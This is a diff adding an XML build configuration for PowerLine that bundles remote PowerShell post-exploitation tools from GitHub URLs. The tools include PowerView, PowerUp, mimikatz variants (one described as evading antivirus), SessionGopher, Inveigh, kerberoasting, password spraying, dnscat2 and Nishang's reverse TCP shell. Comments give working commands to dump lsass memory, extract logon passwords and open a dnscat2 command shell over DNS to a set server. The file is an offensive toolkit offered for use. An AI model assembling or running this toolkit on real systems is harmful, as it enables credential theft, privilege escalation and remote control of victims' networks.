@@ -1,0 +1,54 @@
+﻿<?xml version="1.0" encoding="utf-8" ?>
+<Project>
+  <!-- x86, x64, or Both -->
+  <Architecture> x64 </Architecture>
+  
+  <Scripts>
+
+  	<!-- Compilar con: -->
+  	<!-- 	- build.bat -->
+	<!-- 	- PLBuilder.exe -->
+
+    <!-- Full URLS pointing to PowerShell Scripts on Github, Bitbucket, Your Server, Wherever -->
+    
+    <!-- PowerView -->
+    <Remote>https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1</Remote>
+    
+    <!-- PowerUp -->
+    <Remote>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</Remote>
+	
+	<!-- PowerLine.exe Out-Minidump "Get-Process lsass | Out-Minidump" -->
+	<Remote>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1</Remote>
+	
+	<!-- PowerLine.exe SessionGopher "Invoke-SessionGopher -Thorough" -->
+	<Remote>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1</Remote>
+
+	<!-- Old mimikatz -->
+	<!-- PowerLine.exe Invoke-Mimikatz-old "Invoke-Mimikatz -Command \"`\"sekurlsa::minidump lsass_568.dmp`\" `\"sekurlsa::logonPasswords`\"\"" -->
+	<Remote>https://raw.githubusercontent.com/ricardojoserf/random-stuff/master/windows/powerline-files/Invoke-Mimikatz-old.ps1</Remote>
+
+	<!-- Windows 10 mimikatz -->
+	<!-- Fuente: https://jlajara.gitlab.io/posts/2019/01/27/Mimikatz-AV-Evasion.html -->
+	<!-- PowerLine.exe Invoke-Mimikatz-w10 "Invoke-Mimikatz -Command \"`\"sekurlsa::minidump lsass_568.dmp`\" `\"sekurlsa::logonPasswords`\"\"" -->
+	<Remote>https://raw.githubusercontent.com/ricardojoserf/random-stuff/master/windows/powerline-files/Invoke-Mimikatz-w10.ps1</Remote>
+    
+
+    <!--ruby ./dnscat2.rb - -dns="domain=ricardo.com" - -no-cache -->
+    <!-- Fuente: https://github.com/lukebaggett/dnscat2-powershell -->
+	<!-- PowerLine.exe dnscat2 "Start-Dnscat2 -Domain ricardo.com -DNSServer 192.168.225.139 -Exec cmd"-->
+	<Remote>https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1</Remote>
+
+	<Remote>https://raw.githubusercontent.com/fullmetalcache/tools/master/autokerberoast_nomimi_stripped.ps1</Remote>
+	<Remote>https://raw.githubusercontent.com/fullmetalcache/tools/master/inveigh_stripped.ps1</Remote>
+	<Remote>https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1</Remote>
+	
+	<!-- Fully Qualified Path to Your Local Scripts -->
+    <!-- <Local></Local> -->
+
+    <Remote>https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</Remote>
+    
+  
+  </Scripts>
+  
+</Project>
+
